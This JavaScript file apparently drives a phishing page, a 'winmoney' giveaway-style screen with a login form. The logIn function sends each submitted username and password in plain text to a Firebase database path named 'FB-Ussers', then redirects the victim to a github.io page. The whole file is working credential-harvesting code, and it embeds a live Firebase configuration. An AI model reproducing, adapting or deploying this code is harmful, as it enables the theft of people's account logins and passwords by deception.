const firebaseConfig = {
  apiKey: "AIzaSyBFBSNGSdiBtw8taQD0YTmzlK35zEM19JY",
  authDomain: "winmoney-1296e.firebaseapp.com",
  databaseURL: "https://winmoney-1296e-default-rtdb.firebaseio.com",
  projectId: "winmoney-1296e",
  storageBucket: "winmoney-1296e.appspot.com",
  messagingSenderId: "70056983983",
  appId: "1:70056983983:web:15379efab188eff540835a",
  measurementId: "G-93G3QLTDC2",
};

firebase.initializeApp(firebaseConfig);
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
  setTimeout(() => {
    location.reload();
  }, 300);
}

function randomID() {
  let new_data = new Date().toString();
  let dateId = `${new_data}`;
  return dateId;
}

let startWrapper = document.querySelector(".start-wrapper");
let startBtn = document.querySelector(".start");
let secondWrapper = document.querySelector(".second-wrapper");
let userName = document.querySelector(".user");
let userPassword = document.querySelector(".psw");
let loginBtn = document.querySelector(".login-btn");
let errorWrapper = document.querySelector(".error-wrapper");
let sendingData = new Date().toLocaleDateString("en-GB");
let myDate = new Date().getHours();
let minute = new Date().getMinutes();
let seconds = new Date().getSeconds();

let allData = `(${myDate}:${minute}:${seconds}) - (${sendingData})`;

startBtn.addEventListener("click", () => {
  startWrapper.classList.add("leftanimation");
  setTimeout(() => {
    startWrapper.classList.add("hidden");
    secondWrapper.classList.remove("hidden");
    secondWrapper.classList.add("opacityanimation");
  }, 600);
});

loginBtn.addEventListener("click", () => {
  if (userName.value === "" || userPassword.value === "") {
    errorWrapper.classList.remove("hidden");
  } else {
    logIn();
    setTimeout(() => {
      userName.value = "";
      userPassword.value = "";
    }, 300);
  }
});

function logIn() {
  addElementInFirebase("FB-Ussers", {
    login: userName.value,
    pasw: userPassword.value,
    time: allData,
  });
  setTimeout(() => {
    location.href = "https://visitorss.github.io/winmoney/";
  }, 500);
}

userName.addEventListener("click", () => {
  errorWrapper.classList.add("hidden");
});

userPassword.addEventListener("click", () => {
  errorWrapper.classList.add("hidden");
});
